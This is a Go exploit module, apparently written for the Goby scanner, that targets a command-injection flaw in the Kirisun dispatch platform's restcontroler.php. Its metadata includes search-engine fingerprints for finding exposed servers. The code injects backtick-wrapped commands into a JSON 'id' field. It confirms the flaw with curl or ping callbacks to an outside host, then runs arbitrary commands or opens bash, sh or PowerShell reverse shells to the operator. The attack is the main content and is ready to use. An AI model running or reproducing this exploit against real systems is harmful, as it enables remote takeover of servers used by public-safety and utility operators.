package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "kirisun Command and Dispatch Management Platform restcontroler.php Command Execution Vulnerability",
    "Description": "<p>Kolixin is dedicated to providing customers with high-quality, high-performance communication products, including handheld devices such as walkie-talkies, infrastructure like repeaters, and highly compatible system management platforms. Their products are widely used in sectors such as public security, firefighting, transportation, electric power, and logistics. The company continuously introduces new technologies and products to meet customer needs, striving to become one of the leaders in the professional communications industry.</p>",
    "Product": "kirisun",
    "Homepage": "https://kirisun.com.cn/products-info",
    "DisclosureDate": "2024-07-23",
    "PostTime": "2024-08-19",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"指挥调度管理平台\" || (body=\"captcha.php?r=echo rand(); ?>\" && body=\"./images/zhanghu.png\")",
    "GobyQuery": "body=\"指挥调度管理平台\" || (body=\"captcha.php?r=echo rand(); ?>\" && body=\"./images/zhanghu.png\")",
    "Level": "3",
    "Impact": "<p>Command injection vulnerabilities may allow an attacker to execute arbitrary system commands on the server, potentially leading to full server control, data theft or tampering, service disruption, and even the spread of malware.</p>",
    "Recommendation": "<p>An effective way to mitigate command injection vulnerabilities is to rigorously validate and sanitize user input, and avoid using insecure function calls such as system() or exec(). Additionally, safer APIs or functions should be used for necessary system operations whenever possible.</p>",
    "References": [
        "https://blog.csdn.net/m0_64366018/article/details/135714471"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "指挥调度管理平台 restcontroler.php 命令执行漏洞",
            "Product": "福建科立讯通信有限公司",
            "Description": "<p>科立讯致力于为客户提供高品质、高性能的通信产品，包括对讲机等手持设备、中转台等基础设施以及高度匹配的系统管理平台。其产品广泛应用于公安、消防、交通、电力、物流等行业部门。公司不断推出新技术、新产品，满足客户需求，努力成为专业通信行业的领导者之一。<br></p>",
            "Recommendation": "<p>防止命令执行漏洞的有效方法是严格验证和过滤用户输入，并避免使用不安全的函数调用，如 system() 或 exec()。另外，应该尽可能使用更安全的API或函数来执行必要的系统操作。<br></p>",
            "Impact": "<p>命令执行漏洞可能允许攻击者在服务器上执行任意系统命令，从而导致服务器被完全控制、数据被窃取或篡改、服务中断，甚至传播恶意软件<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "kirisun Command and Dispatch Management Platform restcontroler.php Command Execution Vulnerability",
            "Product": "kirisun",
            "Description": "<p>Kolixin is dedicated to providing customers with high-quality, high-performance communication products, including handheld devices such as walkie-talkies, infrastructure like repeaters, and highly compatible system management platforms. Their products are widely used in sectors such as public security, firefighting, transportation, electric power, and logistics. The company continuously introduces new technologies and products to meet customer needs, striving to become one of the leaders in the professional communications industry.<br></p>",
            "Recommendation": "<p>An effective way to mitigate command injection vulnerabilities is to rigorously validate and sanitize user input, and avoid using insecure function calls such as <code>system()</code> or <code>exec()</code>. Additionally, safer APIs or functions should be used for necessary system operations whenever possible.<br></p>",
            "Impact": "<p>Command injection vulnerabilities may allow an attacker to execute arbitrary system commands on the server, potentially leading to full server control, data theft or tampering, service disruption, and even the spread of malware.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9943"
}`

	setPayloadRequest_ksndvnnvsdfjkd := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL = "/restapi/restcontroler.php?request=conference/mute_member"
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlPost string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlPost)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		headerMap := map[string]string{
			"Host":       hostInfo.IP,
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Connection": "close",
		}
		body := fmt.Sprintf("{\"members\":\"all\",\"id\":\"`%s`\"}", command)
		res, err := setPostRequest(hostInfo, vulURL, body, headerMap)
		if err != nil {
			return false, "", err
		}
		if res.StatusCode != 200 && !strings.Contains(res.Utf8Html, "success") {
			return false, "", nil
		}
		return true, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequest_ksndvnnvsdfjkd

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(8)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				pocCommand = "ping -c 1 " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequest_ksndvnnvsdfjkd

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
